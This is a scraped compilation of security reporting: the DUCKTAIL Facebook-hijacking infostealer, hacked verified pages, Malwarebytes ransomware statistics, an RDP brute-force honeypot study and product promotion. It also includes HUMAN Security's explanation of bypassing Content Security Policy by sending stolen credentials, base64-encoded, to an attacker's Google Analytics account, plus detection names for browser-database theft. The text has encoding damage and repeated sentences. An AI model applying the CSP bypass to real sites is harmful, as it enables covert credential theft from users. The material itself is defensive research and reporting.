 Looking for: WithSecure has discovered an ongoing operation (dubbed ""DUCKTAIL"") that targets individuals and organizations that operate on Facebookâs Business/Ads platform. The threat actor targets individuals and employees that may have access to a Facebook Business account with an information-stealer malware. The malware is designed to steal browser cookies and take advantage of authenticated Facebook sessions to steal information from the victim's Facebook account and ultimately hijack any Facebook Business account that the victim has sufficient access to. The hijacking is achieved by adding the threat actor's e-mail address to the Facebook Business account with Admin and Finance editor roles. In essence, this provides the threat actor unrestricted access to the account. We have observed individuals with managerial, digital marketing, digital media, and human resources roles in companies to have been targeted. WithSecure has identified instances where the malware was delivered to victims through LinkedIn.Â  Based upon analysis and gathered data, we have determined that the operation is conducted by a Vietnamese threat actor. The chain of evidence suggests that the threat actorâs motives are financially driven. The popularity of social network and media platforms remain on the rise, and we expect cybercriminals to be naturally drawn towards exploiting them however they can. We believe this trend will continue as cybercriminals increasingly abuse these platforms to achieve objectives including malware distribution, theft, disinformation campaigns, and fraud. Up until now, weâve been relatively lucky â our most recent examples of social network-based cybercrime reveal threat actors using relatively mild motives (monetization). Future cybercriminal campaigns on social network platforms may not be so gentle. A full report describing the timeline of DUCKTAILâs activities, a detailed analysis of its malware component, and appendices containing indicators of compromise, Yara detection rules, metadata, and MITRE ATT&CK techniques can be downloaded from a link on this page. As with all operations of this nature, vigilance and alertness are key to avoiding becoming a victim. Many spear phishing campaigns target users on LinkedIn, and if you are in a role that has admin access to corporate social media accounts, it is important to exercise caution when interacting with others on social media platforms. It goes without saying that caution should also be exercised when dealing with attachments or links sent from individuals you are unfamiliar with. WithSecure Elements Endpoint Detection and Response detects multiple stages of the attack lifecycle. This will generate a single incident with detailed detections, including: Ducktail infostealer detected File download headless browser Dotnet telegram bot module loadÂ  Webbrowser database file accessed Abnormal connection to telegram api WithSecure Elements Endpoint Protection offers multiple detections that detect the malware and its behavior.

Malwarebytes Threat Intelligence - July 2023 3,https://techcrunch.com/2023/05/05/hacked-verified-facebook-pages-impersonating-meta-are-buying-ads-from-meta/,"Sketchy Facebook pages impersonating businesses are nothing new, but a flurry of recent scams is particularly brazen. A handful of verified Facebook pages were hacked recently and spotted slinging likely malware through ads approved by and purchased through the platform. But the accounts should be easy to catch â in some cases, they were impersonating Facebook itself. Social consultant Matt Navarra first spotted some of the ads, sharing them on Twitter. The compromised accounts include official-sounding pages like “Meta Ads” and “Meta Ads Manager.” Those accounts shared suspicious links to tens of thousands of followers, though their reach probably extended well beyond that through paid posts. How did this ad get approved @Meta ? ð¬ Verified account impersonating Meta tricking users into downloading shady tools pic.twitter.com/maPW6RWL3F — Matt Navarra (@MattNavarra) May 4, 2023  In another instance, a hacked verified account purporting to be “Google AI” pointed users toward fake links for Bard, Google’s AI chatbot. That account previously belonged to Indian singer and actress Miss Pooja before the account name was changed on April 29. That account, which operated for at least a decade, boasted more than 7 million followers. It gets worseâ¦! ANOTHER verified @Facebook has been hacked and itâs pretending to be @GoogleAI  And itâs running are against the post! pic.twitter.com/fbe5utA53D — Matt Navarra (@MattNavarra) May 5, 2023  Facebook now tracks and publicly displays a history of name changes for verified accounts â a welcome bit of transparency but a safeguard that apparently isn’t enough to flag some obvious scams. What’s most egregious in these cases is that the hacked pages were not only impersonating major tech companies, including Meta itself, but that they were able to purchase Facebooks ads and go on to distribute suspicious download links. In spite of very recent account name changes, those ads were apparently approved without issue in Meta’s automated ads system. All of the impersonator pages Navarra identified have since been disabled. This week, Meta shared a report on a recent spate of AI-themed malware scams. In those instances, hackers lure Facebook, Instagram and WhatsApp users to download malware by posing as popular AI chatbot tools like ChatGPT. One of those clusters of malware known as DuckTail has been plaguing businesses on Facebook for a few years now. As TechCrunch’s Carly Page explained this week: Meta says that attackers distributing the DuckTail malware have increasingly turned to these AI-themed lures in an attempt to compromise businesses with access to Facebook ad accounts. DuckTail, which has targeted Facebook users since 2021, steals browser cookies and hijacks logged-in Facebook sessions to steal information from the victimâs Facebook account, including account information, location data and two-factor authentication codes. The malware also allows the threat actor to hijack any Facebook Business account that the victim has access to. It’s possible that the Facebook pages that impersonated Facebook and went on to buy malware-laden ads were compromised through DuckTail or malware like it. “We invest significant resources into detecting and preventing scams and hacks,” a Meta spokesperson told TechCrunch. “While many of the improvements weâve made are difficult to see â because they minimize people from having issues in the first place â scammers are always trying to get around our security measures.” Impersonator accounts and compromised business pages have long been a headache for business owners across Facebook and Instagram. Meta Verified, the company’s newly launched verification program, is positioned to improve the company’s notoriously thin level of customer support for businesses that rely on its apps. Controversially, Meta’s promising offer of “proactive account protection” isn’t a free improvement â Instagram and Facebook accounts will need to pay $14.99 a month to secure the higher level of customer support, a price many businesses will likely begrudgingly pay to avoid drowning in a sea of scam accounts.

Malwarebytes Threat Intelligence - July 2023 3,https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp,"CSP can define a list of domains that the browser should be allowed to interact with for the visited URL. Designed to guard against XSS attacks, CSP helps control which domains can be accessed as part of a page and therefore restricts which domains to share data with. It even can restrict forms to be sent only to specific hosts, using the form-action directive. These restrictions are specified by a list of allowed URIs. Unfortunately, the path matching algorithm used ignores query strings. As is often the case, an embedded third-party service that identifies its userâs account using a query string canât be restricted to a given account. By analyzing field data we see a gap in the implementation of CSP, and even for sites that do use it correctly, this creates an open window to exfiltrate data. Our demonstration shows how using the Google Analytics API, a web skimmer can send data to be collected in his own account instance. As Google Analytics is allowed in the CSP configuration of many major sites, this demo shows how an attacker can bypass this security protection and steal data. Our gathered field data shows the following statistics on CSP usage across the Internet (based on HTTPArchive March 2020 scan): Looking at the top 3M domains, only 210K use CSP. Out of these: Most donât even do much besides Since the most common allowed domain is google-analytics.com (17K websites) it was the natural candidate to test our theory. So letâs dive in and see what can be done with that. In our demonstration, using a simple mechanism, we can leak data over commonly allowed third-party domains. We took google-analytics as an example, but other services can also be used. As an example, we took the twitter login page, which implemented the following CSP rule (which contains https://www.google-analytics.com):  The following short JS code inserted into the site will send the credentials to google-analytics console controlled by us: The UA-#######-# parameter is the tag ID owner that Google Analytics uses to connect the data to a specific account. Instead of using twitterâs google-analytic account, we used an account we control. Unfortunately, the CSP policy canât discriminate based on the Tag ID. This will allow the dp parameter to be sent to our account. Though Google meant to have this parameter be used to mention the page the user visited, we used it to exfiltrate the user name and password data encoded in base64. In our Google Analytics platform, we will see the data as:  In our demo the DP will result in page view of bmV3ZW1haWxAcGVyaW1ldGVyeC5jb206bmV3cGFzcw== Which will be decoded from base64 as: ""newemail@perimeterx.com:newpass"" The source of the problem is that the CSP rule system isnât granular enough. Recognizing and stopping the above malicious JavaScript request requires advanced visibility solutions that can detect the access and exfiltration of sensitive user data (in this case the userâs email address and password). One might think we could have updated the CSP to only allow specific TIDs: 'connect-src https://www.google-analytics.com/r/collect?*tid=[SPECIFIC_ACCOUNT]'. The problem is that CSP doesn't support query strings (See Spec): Note: Query strings have no impact on matching: the source expression example.com/file matches all of https://example.com/file, https://example.com/file?key=value, https://example.com/file?key=notvalue, and https://example.com/file?notkey=notvalue. Having such a gap with the most commonly used domain allowed with CSP is a major risk indicator of the threats that can come from other domains that are used to serve multiple accounts. A possible solution would come from adaptive URLs, adding the ID as part of the URL or subdomain to allow admins to set CSP rules that restrict data exfiltration to other accounts. A more granular future direction for strengthening CSP direction to consider as part of the CSP standard is XHR proxy enforcement. This will essentially create a client-side WAF that can enforce a policy on where specific data field are allowed to be transmitted. While CSP is a useful tool to have in your web security tool belt, it is not foolproof. In addition to the complexity of managing CSP rules, this vulnerability shows how widely used services such as Google Analytics can be subverted to bypass this protection. Partners"

 This article is based on research by Marcelo Rivero, Malwarebytes' ransomware specialist, who monitors information published by ransomware gangs on their Dark Web sites. In this report, ""known attacks"" are those where the victim didn't pay a ransom. This provides the best overall picture of ransomware activity, but the true number of attacks is far higher. In a surprising turn of events for the ransomware landscape, Cl0p has emerged as the most used ransomware in March 2023, dethroning the usual frontrunner, LockBit. Indeed, while LockBit was still used in 93 successful attacks last month, it couldn't quite match the sheer force of Cl0p's sudden resurgence. Contributing to Cl0p's rise to the number one spot was its extensive GoAnywhere campaign. The group successfully breached over 104 organizations by taking advantage of a zero-day vulnerability in the widely-used managed file transfer software, GoAnywhere MFT. March has also seen some intriguing activity from other ransomware gangs like DarkPower, which appeared to be turning on and off throughout the month, as well as BianLian, which has shifted its focus from encrypting files altogether to pure data-leak extortion. Fortra, the company behind GoAnywhere MFT, released an emergency patch (7.1.2) for the vulnerability in early February—but by then, Cl0p had already used it to break into a myriad of networks and deploy ransomware. Recent research by Malwarebytes highlighted the bias that ransomware gangs have for attacking English-speaking countries, and the Cl0p campaign follows the same trend. Between them, the Anglosphere countries of the USA, Canada, UK, and Australia accounted for 69% of known Cl0p attacks, with Canada and Australia suffering more attacks than countries with bigger populations and economies, like Germany and France. Cl0p's ability to exploit a zero-day to such effect is akin only in recent memory to the Kaseya VSA ransomware incident in July 2022. The Kaseya attack involved a malicious auto-update that pushed the REvil ransomware onto victims' machines, primarily targeting Managed Service Providers (MSPs), causing widespread downtime for over 1,000 companies. The successful use of zero-day vulnerabilities by ransomware gangs like Cl0p and REvil is, thankfully, relatively rare. However, when it happens it can be devastating. Ransomware gangs are always looking for new tactics to help them maximize the impact of their attacks and, rare or not, we should all be concerned about the example Cl0p has set for weaponizing a newly discovered vulnerability and exploiting it before a patch is released or applied. Cl0p wasn’t the only gang we saw last month experiencing an unexpected surge in activity. In January 2023, we noted a complete absence of activity from BlackBasta, a group which up to that point had usually ranked highly on our monthly charts. That trend continued into February, but in March it returned with a vengeance with over 40 known victims. It’s hard to tell why BlackBasta went underground for two months only to eventually burst back onto the scene, but it's possible that the group was working on developing new attack techniques or evading detection. Other possibilities are a sudden change in leadership, that the group wanted to lay low to avoid the attention of law enforcement, or it simply wanted a break. This kind of thing isn't unusual and the group's sudden re-emergence highlights the unpredictable nature of ransomware gangs and the need for constantly monitoring the latest threat intelligence. Just because a group is gone today doesn't mean it won't be back tomorrow. Meanwhile, LockBit’s activity in March was headlined by a major ransomware attack on Essendant, a US-based distributor of office products. This attack, which is said to have begun on or around March 6, created severe ramifications for the organization, disrupting freight carrier pickups, online orders, and access to customer support. In other LockBit news, a CISA advisory on LockBit 3.0 ransomware was released on March 16, 2023. LockBit 3.0, also called LockBit Black, was discovered in June 2022. While many of LockBit 3.0’s TTPs remain consistent with previous versions, the advisory sheds light on the updated and enhanced features in LockBit 3.0. These improvements include more advanced detection evasion methods and customization options that enable affiliates to modify the ransomware's behavior according to their requirements, making the ransomware harder to detect and counter. March saw the rise of Dark Power, a new ransomware group that tallied 10 victims. Dark Power’s ransomware is interesting in that it is written in the relatively obscure Nim programming language. Dark Power's approach to ransomware, despite being relatively basic, manages to create unique encryption keys for each targeted machine, making it difficult to develop a generic decryption tool. The ransomware effectively stops services and terminates processes, ensuring the encryption process is unhindered. It also clears logs, making it harder for analysts to investigate an attack. The effectiveness of Dark Power ransomware underlines the fact that attackers do not always need advanced, novel techniques to succeed. A basic approach, executed well and combined with an adaptable programming language, can prove to be just as effective. BianLian, a ransomware gang that first appeared in July 2022 and has consistently hovered near the top of our monthly charts, has shifted its focus from encrypting files to data-leaks. The group's shift in focus can be attributed to the release of a decryption tool by Avast, which made encrypting files less effective for BianLian. Consequently, the group now focuses on threatening to leak stolen data to extort payments from victims instead. BianLian's shift toward data-leak extortion demonstrates that RaaS gangs can be highly adaptable to changing circumstances, such as the emergence of decryption tools that undermine encryption-based ransomware. This strategic shift allows them to maintain a steady income stream, even as traditional methods lose their effectiveness. As organizations face the daunting prospect of sensitive data leaks or security breach exposure, they are more likely to pay ransoms to avoid legal, financial, and reputational repercussions. Furthermore, the lingering threat of leaked data, even after recovering encrypted files, makes it harder for victims to resist paying ransoms.  Our Ransomware Emergency Kit contains the information you need to defend against ransomware-as-a-service (RaaS) gangs.

TrustWave, authors of the the report the article was based on, certainly weren't surprised that REvil didn't want to run in Russia. They give it barely a mention.

Ransomware really caught the world's attention in May when threat actors using DarkSide ransomware kicked the hornet's nest by attacking the Colonial Pipeline, the largest fuel pipeline in the US. But as many readers will know, ransomware attacks have been relentless over the past few years, escalating each year. Even a global pandemic didn't hamper the ransomware gangs' activities, and just this year targets have included countless private companies, as well as hospitals, law enforcement agencies, governments, charities, and critical infrastructure.

Russia-averse ransomware families
 
The Commonwealth of Independent States (CIS, for short, or Sodruzhestvo Nezavisimykh Gosudarstv in Russian), is an international organization comprised of Russia and other republics that used to be part of the Soviet Union. Armenia, Azerbaijan, Belarus, Kazakhstan, Kyrgyzstan, Moldova, Russia, Tajikistan, and Uzbekistan are member states of CIS. The two founding states, Ukraine and Turkmenistan, are allowed to participate in CIS although they are not recognized as official members.

The two founding states, Ukraine and Turkmenistan, are allowed to participate in CIS although they are not recognized as official members. 
Malwarebytes researchers have compiled a list of the most prolific ransomware families based on the number of known attacks in the first half of 2021 (this does not include the cascading Kaseya attack from July) and whether or not that ransomware will run in the CIS. None of them do. Almost anything is fair game for ransomware gangs it seems, unless it happens to be located in the CIS.

This does not include the recent Kaseya supply-chain attack. The true number of attacks is certainly higher. 
 
Among the 13 ransomware families listed in the table, 10 are known to be active. Avaddon and DarkSide seem to have been disrupted by law enforcement agencies. The CL0P money laundering operation was raided in June but attacks involving that ransomware have continued. The group behind Babuk Loader recently announced it was quitting the ransomware encryption scene but its ransomware builder later emerged on VirusTotal, and ransomware built with it has since been used in attacks. Following the enormous Kaseya attack, the websites and infrastructure of the REvil ransomware group have been shut down. Despite rampant speculation, the cause is unknown.

How ransomware avoids CIS countries
 
There are a number of techniques that ransomware creators commonly use and include in their code to avoid CIS countries, such as hard-coding country names and geographical territories, and checking the system language.

Some threat actors include code to check for the default system language by, for example, calling the GetUserDefaultLangID or GetLocaleInfoW functions, which return a language particular to a userâAmerican English, for example. Another checking process retrieves the victimâs IP address via a public API, such as api.ipify.org. Because IP addresses are allocated geographically they can be used to guess the user's rough location.

Although ransomware tries very hard not to run in Russia or the CIS, sometimes it does. Where ransomware has netted systems in those countries by accident the attackers have been known to hand over decryptor keys and apologize for the error.

On rare occasions threat actors have also chosen to avoid other targets based on the country they're in. Famously, a Syrian father took to Twitter to plead with Coveware to mediate between him and GandCrab ransomware operators, to let him see his boys again. In an underground forum post, GandCrab threat actors decided to release decryption keys to anyone else affected by their attack in Syria. They also stated that not including Syria in the list of countries to avoid was a mistake. Their benevolence was patchy though, and targets outside Syria, including hospitals, were still considered fair game.

Why does ransomware avoid Russia?
 
So what's behind ransomware's keenness to avoid attacks inside the CIS? Although it's possible that some ransomware gangs operate with the active cooperation of the Russian state, that isn't the prevailing view.
 So what's behind ransomware's keenness to avoid attacks inside the CIS? Although it's possible that some ransomware gangs operate with the active cooperation of the Russian state, that isn't the prevailing view. 
The Biden administration, and many security professionals, believe that ransomware gangs are either operating with Russia's blessing or that the country is turning a blind eye. Ransomware gangs don't expect to face any penalty from inside the CIS, provided they avoid attacking its organizations. And since Russia has no extradition treaty with the US, the gangs operating there are also unreachable and untouchable by US law enforcement.

Put simply, ransomware is a low risk, high reward form of cybercrime, if you avoid the CIS.

""Those behind these malicious activities should be held accountable for their actions. That includes governments that do not use the full extent of their authority to stop the culprits,"" says Homeland Security Secretary Alejandro Mayorkas in a speech he gave on March 31.

This sentiment is also echoed by the Ransomware Task Force (RTF), a group of expert volunteers tasked with tackling the ransomware problem and finding ways to disrupt it. In its April report [PDF], the RTF urged the US government to spearhead international coordination efforts to tackle the global problem of ransomware. Among a host of recommendations, it also suggested that ransomware be viewed as a threat to national security, and that the Racketeer Influenced and Corrupt Organizations Act, otherwise known as the RICO Act, be expanded to include ransomware gangs.

On several occasions, the Biden administration has indicated it intends to aggressively go after ransomware gangs. This includes treating, investigating, and prosecuting ransomware attacks as if they were terrorism. Involving the military is also being carefully considered, according to Commerce Secretary Gina Raimondo. Meanwhile, General Secretary of Nato Jens Stoltenberg told BBC Newsnight that the organization could respond to cyberattacks with military force ""by air, sea, or land.""

Don't invest in Russian keyboards
 
Regardless of whether ransomwareâor any malware, for that matterâchecks to see if its victim is in a CIS or CIS-affiliated state or not, it is worth remembering that the ""big game"" attacks they are used in are not automated. A level of human involvement is part of the modus operandi.

So, before you think about buying Russian keyboards, installing Russian language packs, or other weird tricks, realize that by the time a ransomware operator has put themselves in a position to attack you, they know a lot about you and your business, such as where your main HQ and satellite offices are. Trying to convince them otherwiseâat any point, reallyâis a bit ridiculous, impractical, and a waste of effort.

 This article is based on research by Marcelo Rivero, Malwarebytes' ransomware specialist, who monitors information published by ransomware gangs on their Dark Web sites. In this report, ""known attacks"" are those where the victim didn't pay a ransom. This provides the best overall picture of ransomware activity, but the true number of attacks is far higher. For regular ransomware gang updates, check out our monthly ransomware reviews. Ransomware gangs have made the past year a hard one for the education sector. Between June 2022 and May 2023, there were 190 known ransomware attacks against educational institutions, and many more that went unreported and unrecorded. Between the first and second six months of that period, education experienced an 84% increase in attacks. Known ransomware attacks against education, June 2022-May 2023 Although the attacks were carried out by a large number of different ransomware gangs, one in particular was responsible for the lion's share (23%). Vice Society is a gang that specializes in attacking education, and almost half of its activity (43%) is directed against the sector.  Distribution of Vice Society attacks vs other ransomware gangs, June 2022-May 2023 Further findings from the data show that, while ransomware attacks against education are a global phenomenon, the USA (with 56% of known attacks) and the UK (with 15%) were hit the most frequently attacked countries between June 2022 and May 2023. We’ll spend the rest of this blog breaking down attacks on education by gangs, countries, and which gangs attack which countries the most. The leading gangs that targeted the education sector between June 2022 and May 2023 include Vice Society with 43 attacks, LockBit with 33, BianLian (18), Royal (16), and AvosLocker (15). A few of the educational institutions attacked in the last year include De Montfort School, Cincinnati State, and one that made national headlines in September: Los Angeles Unified, the second largest school district in the US. The stakes are no joke: schools and colleges have suffered an estimated 1,600 days of downtime due to ransomware attacks, and the average cost of a ransomware breach was $4.54 million in 2022.   Top ten ransomware used in attacks against education, June 2022-May 2023 In total, 26 separate ransomware-as-a-service gangs contributed to the onslaught on education. When we break down education sector attacks by country, it becomes clear that no region is safe from ransomware. The USA bore the brunt, with 107 reported attacks.   Known attacks on education by country, June 2022-May 2023 The United Kingdom followed distantly with 28 known attacks, while other countries like Canada, Germany, Brazil, and others also fell prey to these cybercriminals. Comparatively speaking, however, the education sector in the UK suffered far more than in other countries. Education was the target in 15% of known attacks in the UK from June 2022 to May 2023, compared to only 3% in France, 4% in Germany, and 8% in the USA. In general, the ransomware activity of the top gangs seems to adhere to a common trend: Most of them spread their attacks across multiple countries, displaying a diverse geographical targeting. However, we do find an intriguing outlier that challenges the established patterns: Vice Society’s strong focus on the United Kingdom. Vice Society was responsible for 66% of known attacks on UK education institutions May 2022 to April 2023.  UK education ransomware attacks by gang, June 2022-May 2023 It is worth remembering that our numbers only reflect attacks where a ransom wasn't paid, and the true number of attacks is far larger. This activity is distinct from the typical spread of ransomware attacks seen among other top gangs, which generally have a more balanced distribution across several countries, including the United States, Canada, and various European countries, charted below.  USA education ransomware attacks by gang, June 2022-May 2023  Global ransomware attacks by gang, excluding the USA and UK, June 2022-May 2023 To recap, our key findings include: Looking ahead, it is anticipated the trend of ransomware gangs targeting the education sector will persist or even intensify. The reality is that tight budgets of many educational institutions force them to struggle with outdated equipment and limited staff, making them an easy target for ransomware gangs.  But with knowledge comes power. The more the education sector knows about ransomware threats like Vice Society, the better prepared they are to defend against them.

 This article is based on research by Marcelo Rivero, Malwarebytes' ransomware specialist, who monitors information published by ransomware gangs on their Dark Web sites. In this report, ""known attacks"" are those where the victim didn't pay a ransom. This provides the best overall picture of ransomware activity, but the true number of attacks is far higher. According to a recent Malwarebytes Threat Brief, in the last 12 months, the Vice Society ransomware gang has conducted more known attacks against education targets globally, and in the USA and the UK individually, than any other ransomware group. Although attacks on education have been a staple of the ransomware ecosystem for years, Vice Society appears to have specialised in delivering misery to schools, colleges, and universities in a highly unusual way. Education accounts for a huge proportion of known Vice Society attacks. Between April 2022 and March 2023, 39% of the gang's attacks hit education, compared to an average of just 4% across all the other ransomware groups tracked by Malwarebytes. Vice Society’s targeting of education is undoubtedly deliberate and has likely allowed the gang to develop domain-specific techniques and expertise. The result is that Vice Society is the most prolific attacker of education institutions in the two most attacked countries in the world: the USA and the UK. In the USA, Vice Society is the most active among a group of gangs. In the UK, Vice Society accounts for a staggering proportion of known ransomware attacks on education—almost 70%. The stakes for education could not be higher. In a modern ransomware attack the target is an entire organisation, not just one or two computers. The attackers' aim is to put the organisation in an unbearable position by stopping it from functioning, and then demanding a ransom that can stretch to millions of dollars. It is a challenge for any organisation to fight off a determined ransomware gang like Vice Society, but schools face the added pressure of doing so in a notoriously tight budgetary environment. According to the Education Data Initiative, ""Public education spending in the United States falls short of global benchmarks and lags behind economic growth."" In the UK, education has suffered a significant drop in funding in the last decade, according to the non-partisan Education Policy Institute. School budgets are tight and institutions are understandably keen to direct their budgets at things that directly benefit pupils. Schools, colleges, and universities must somehow reconcile tight budgets with the need to deploy a sophisticated enough detection and response capability to find and evict stealthy adversaries like Vice Society.

 Thanks to the Malwarebytes Threat Intelligence Team for the information they provided for this article. Not long ago, guessing a Windows Remote Desktop Protocol (RDP) password successfully was widely regarded as ransomware operators' number one choice for breaching a target. It attracted a lot of press coverage three or four years ago, and interest in it was renewed in 2020 by the sudden addition of a million or so RDP-connected computers to the Internet, with the onset of the pandemic and wide-scale working from home. Things have been a little quiet since, and in 2021 RDP was eclipsedâin the press at leastâby ransomware gangs' use of a whole host of different and diverting vulnerabilities, such as the ProxyLogonattack chain. You'd be forgiven for thinking that RDP abuse was a thing of the past. It is not. RDP is a fantastically powerful feature of Windows that makes remote work and remote administration feel like it isn't remote at all. If a Windows computer has an Internet connection, and RDP switched on, it can be used from anywhere by anyone with a valid username and password, with all the same features and access rights as if they were sat right in front of it. RDP is so useful that millionsof Internet-connected Windows computers have it enabled. We know this because it is trivially easy to find them, and that's a problem. To see why, imagine that you work in an office building that doesn't close its doors at night and instead lets criminals wander around, trying their luck at logging on to its computers. The criminals are in no hurry, they can come back night after night, so they have plenty of time to find a computer with a weak password, or to plug away at one computer trying more and more complex passwords. The Internet is like that overly-permissive officeâand thanks to RDP it has over four million computers exposed to every cybercrook in the world, and their password guessing software. RDP password guessing has been an enormously important technique for ransomware gangs in the last few years, because it allows them to breach a victims' network disguised as a legitimate employee. It has been so successful that it has spawned criminals who specialise in guessing RDP passwords, and markets where they can sell them to ransomware operators. The Malwarebytes Threat Intelligenceteam maintains RDP honeypots that track the effectiveness of Malwarebytes Brute Force Protection(BFP), a countermeasure against RDP password guessing. The honeypots provide a revealing insight into the enormous amount of RDP brute-forcing attacks happening in the background, all day, every day. We took a slice of data from an unremarkable period of last yearâthe last 15 days of October 2021âto illustrate the scale of the problem.  The honeypot in our test was an Internet-connected Windows computer with RDP enabled on a non-standard port. It used out-of-the-box BFP rate-limits: Attackers were shut out for five minutes if they entered five incorrect passwords within the space of five minutes. There is nothing about our honeypots that makes them more tempting than any other targets. If you have RDP-enabled computers, you can assume that each and every one is attracting a similar level of attention from password guessing attacks. In the last 15 days of October, a five-minute BFP lockout was triggered 28,910 times, by attacks from 29 separate IP addresses. Because it takes five attempts to trigger a lockout, the total number of password attempts made against the honeypot during that test period was therefore 144,550, or about 10,000 per day. This figure is likey to be dampened considerably by the rate limitingâwithout it, the numbers would likely have been much higher. The five IP addresses that probed the honeypot most frequently during that time all presisted for about ten days, in overlapping shifts. This similarity in the number of daily guesses they made, and the time they spent making guesses, may indicate that they come from the same attacker using multiple IP addresses. RDP normally uses port 3389. Since it is easy to scan the Internet for computers listening on port 3389 it is fairly common for RDP hardening advice to recommend assigning it a different port number. The honeypots in this test do that: They are connected using a port from the dynamic port range, which is unlikely to be any hacker's first guess. Despite that, our honeypots' RDP ports receive heavy and continuous attention from brute-force password guessing programs. It is our assessment that changing the port number does not provide any meaningful protection. It's a cheap and easy change to make, and there is no harm in it, but you should look elsewhere for genuine hardening. Rate limiting works by throttling the speed at which attackers can make password guesses, typically by shutting them out for a period of time after a small number of incorrect guesses. This is mildly inconvenient to a real user who is unlikely to make more than a handful of incorrect guesses before calling support, but represents a huge barrier for a computer program looking to race through tens or even hundreds of thousands of password attempts. Rate limiting is what allows enormously important things like credit cards and smartphones to be secured with four- or six-digit PINs that are otherwise trivival to crack.  So how many guesses does rate limiting prevent? In our test, attackers were shut out for five minutes if they entered five incorrect passwords within the space of five minutes. Our attackers were persistent over several days and received, on average, about 150 bans per day. To trigger 150 bans per day, our attackers must have made 750 incorrect guesses and incurred 750 minutes of bans, leaving them 690 minutes of the day in which to guess passwords. 750 guesses in 690 minutes gives us a guessing rate of about one password every 55 seconds, or about 1,500 guesses per day. At that guessing rate, rate limiting reduced the number of daily password attempts from 1500 to 750, halving the effectiveness of the attack and doubling the time a security team would have to react. But 1,500 guesses per day is an extremely low guessing rate and a very poor use of an attackers' resources. Other attackers are much more aggressive in their approach. A few years ago I co-authored a research paper on RDP brute forcing. During our research we monitored an attacker who made 109,934 password guesses in ten days, at a rate of about 11,000 guesses per day, or about 7.5 guesses per minute. Against that attacker, the rate limiting we used for this article would have been triggered every 40 seconds, allowing them just 1,270 guesses per dayâreducing the guessing rate by 87%, giving a security team an additional two and a half monthsto respond to the attack. Rate limiting is a powerful technique for limiting the effectiveness of brute-force attacks. However, in all areas of security we recommend a defense-in-depth approach over a reliance on any one tool or technique.

Sources: 2020 EDR Solutions Study, Ponemon Institute   Almost 60% of firms need zero-day detection, but high false positives are a key concern.                                                                      More than 61% of firms say complexities and limited staff are significant challenges with EDR products.                                                                      Detection and protection against ransomware, malware, trojans, rootkits, backdoors, viruses, brute force attacks, and “zero-day” unknown threats that other EDR tools don't catch.  Malwarebytes Endpoint Detection and Response for Windows and Mac can easily replace or augment other endpoint security solutions, including Microsoft Defender.

   Higher Remote Desktop Protocol (RDP) usage resulting from the COVID-19 pandemic have exposed an exploitable vector for ransomware.                                      Malwarebytes Endpoint Detection and Response now includes Malwarebytes Brute Force Protection to block malicious login attempts and prevent intrusion attacks targeting RDP on Windows workstations and servers.
                                
                                Our powerful scan and detection engine provides stronger protection against infections from exploits and packaged and polymorphic malware, making it ideal for remote work environments where users may be easier targets.     Sophisticated attacks exploit entry points and security vulnerabilities, and once attackers are inside, they can set hooks that cause serious damage.                                      Malwarebytes Endpoint Detection and Response now includes improved enterprise-class detection that leverages our anomaly detection machine learning technology. âZero-dayâ detection has been enhanced to find and stop unknown threats.
                                    
                                    Obfuscated malware can cleverly bypass traditional EDR. Our expanded detection capabilities catch these threats, and our enhanced behavioral detection alerts on anomalies in user behaviors.     The average enterprise security team spends over 25 percent of their time chasing thousands of false positive alerts each month (Ponemon).                                      Malwarebytes Endpoint Detection and Response solves this problem by ensuring an optimal balance between high effectivity with our advanced anomaly detection and low false positives alerts.
                                    
                                    New U.S. and international compliance mandates now require more stringent protection of Personal Information (PI). Firms may only have small windows to prove that alerts did not expose PI or they could be fined, forced to publicly announce, and be sued for millions.     If an endpoint is attacked, you can easily halt malware from spreading and causing harm.                                      Network isolation limits device communications, so attackers are locked out and malware canât âphone home.â
Process isolation restricts which operations can run, halting malware and enabling remote retrieval of suspicious code for investigation while still allowing end users to work away.
                                        
Desktop isolation  alerts the end user of the threat, temporarily blocks their access, yet keeps the device online for analysis.
                                        
                                        With multiple modes of attack isolation, both security teams and end-users maximize their productivity even during attacks.     Find and reverse all major and subtle changes made by malware.                                      While traditional approaches focus on removing only the active executable, they ignore residual change that leads to re-infection or pesky PUPs and PUMs. Youâre then left to reimage the device, or hope for the best.
                                    
                                    Quite the opposite, the proprietary Malwarebytes Linking Engine tracks every artifact, change, and process alteration (including memory executables others miss). A true âone and doneâ solution, it then maps out the correct path to remove all malware permanently, including PUPs and PUMs.     For Windows environments, paying ransomware is no longer a requirement.                                      Itâs possible because we make use of local cache on each endpoint, storing all relevant changes to the device for up to 72 hours. If youâre infected, Malwarebytes simply backs out device changes and restores files that were encrypted, deleted, or modified. And data storage space isnât an issue, as our proprietary dynamic exclusion technology learns âgoodâ behavior of applications and minimizes storage utilized.
                                    The result is peace of mind knowing that ransomware wonât damage your bottom line, reputation, customer experience, or team productivity.     With a few simple clicks you can protect your business and brand, improve your regulatory compliance posture, and avoid costly downtime.

So far in 2023, ransomware gangs hit the US, Germany, France, and the UK hard, with the US shouldering a hefty 43% of all global attacks. Some groups are even exploiting zero-day vulnerabilities, allowing them to cast a wider net of victims.   But with knowledge of the bad guys comes the power to defeat them.   In this report, we look at the top ransomware gangs and equip your organization with the intel needed to counter their attack techniques. Our 2023 Ransomware Report unpacks the action in four zones: the US, Germany, France, and the UK.   We highlight in particular the ascension of the CL0P group, which has effectively harnessed zero-day vulnerabilities to amplify its attacks.    This isn't just a one-off, it's an emerging trend with potential to redefine the game. If more groups start adopting CL0P's zero-day exploitation techniques, the ransomware landscape could tilt from service-oriented attacks to a more aggressive, vulnerability-focused modelâa move that could skyrocket the impact of attacks.   141 attacks on four countries in six months You'll uncover why the US has seen a significant uptick in ransomware incidents across the board, especially in sectors like education.   We'll delve into the recent four-month spike in attacks against the UK, the unsettling uptick in attacks on France's government sector, and how Germany retained its spot as the fourth most targeted country in the world.   Through it all, our 2023 State of Ransomware equips your organization with the knowledge to counter the hidden mechanics of global ransomware.     The Malwarebytes Threat Intelligence team is a highly skilled group of malware analysts. They collect, process, and analyze data about cyberthreats from a variety of public and private sources, creating timely, actionable, and engaging intelligence to keep organizations and our global partners up-to-date about todayâs threat landscape.    Overtook LockBit twice as most month's active ransomware Exploited zero-days in GoAnywhere MFT and MOVEit Transfer to gain an edge 1,462 known ransomware attacks 48 separate ransomware groups attacking the USA 75% increase in the average number of monthly attacks"

